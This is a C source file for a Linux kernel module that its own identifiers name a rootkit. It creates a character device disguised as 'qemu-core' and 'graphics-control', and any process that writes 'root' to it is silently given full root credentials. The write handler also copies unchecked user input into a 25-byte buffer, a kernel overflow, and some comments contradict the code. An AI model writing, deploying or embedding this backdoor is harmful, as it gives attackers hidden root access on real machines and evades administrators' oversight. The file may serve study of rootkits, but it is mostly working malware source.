#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/version.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/kmod.h>
#include "rootest.h"

MODULE_AUTHOR("");
MODULE_DESCRIPTION("");
MODULE_LICENSE("GPL");

static unsigned int major;          /* major number for device */
static struct class *rootkit_class; /* graphics is our malicius class*/
static struct cdev rootkit_cdev;
static char secret_message[25];

int open(struct inode *inode, struct file *filp)
{
    return 0;
}

int release(struct inode *inode, struct file *filp)
{
    return 0;
}

ssize_t read(struct file *filp, char __user *buf, size_t count,
             loff_t *offset)
{
    return 0;
}

ssize_t write(struct file *filp, const char __user *buf, size_t count, loff_t *offset)
{
    /**
     * Copy the user sended message
     * ex: echo "root" > /dev/tty8
     * */
    if (copy_from_user(secret_message, buf, count))
    {
        pr_info("Failed to copy data from user\n");
        return -EFAULT;
    }

    /**
     * Compare the message
     * If the message is equal to "root" then
     * exectute arbitrary code
     * */
    if (0 == strncmp(secret_message, "root\n", 4))
    {
        struct cred *new_creds = prepare_kernel_cred(NULL);
        if (new_creds)
        {
            new_creds->uid.val = new_creds->gid.val = 0;
            new_creds->euid.val = new_creds->egid.val = 0;
            new_creds->suid.val = new_creds->sgid.val = 0;
            new_creds->fsuid.val = new_creds->fsgid.val = 0;
            commit_creds(new_creds);
        }
    }
    return count;
}

struct file_operations fops = {
    open : open,
    release : release,
    read : read,
    write : write,
};

static int __init rootkit_init_module(void)
{
    struct device *rootkit_device;
    int error;
    dev_t devt = 0;

    /* Get a range of minor numbers */
    error = alloc_chrdev_region(&devt, 0, 1, "qemu-hdi");
    if (error < 0)
    {
        return error;
    }
    major = MAJOR(devt);

    /* Create device class, visible in /sys/class */
    /** Create graphicss-control class : "/sys/class/graphics-control"*/
    rootkit_class = class_create(THIS_MODULE, "qemu-core");
    if (IS_ERR(rootkit_class))
    {
        unregister_chrdev_region(MKDEV(major, 0), 1);
        return PTR_ERR(rootkit_class);
    }

    /* Initialize the char device and tie a file_operations to it */
    cdev_init(&rootkit_cdev, &fops);
    rootkit_cdev.owner = THIS_MODULE;
    /* Now make the device live for the users to access */
    cdev_add(&rootkit_cdev, devt, 1);

    rootkit_device = device_create(rootkit_class, NULL, devt, NULL, "graphics-control");

    if (IS_ERR(rootkit_device))
    {
        class_destroy(rootkit_class);
        unregister_chrdev_region(devt, 1);
        return -1;
    }
    return 0;
}

static void __exit rootkit_cleanup_module(void)
{
    unregister_chrdev_region(MKDEV(major, 0), 1);
    device_destroy(rootkit_class, MKDEV(major, 0));
    cdev_del(&rootkit_cdev);
    class_destroy(rootkit_class);
}

module_init(rootkit_init_module);
module_exit(rootkit_cleanup_module);
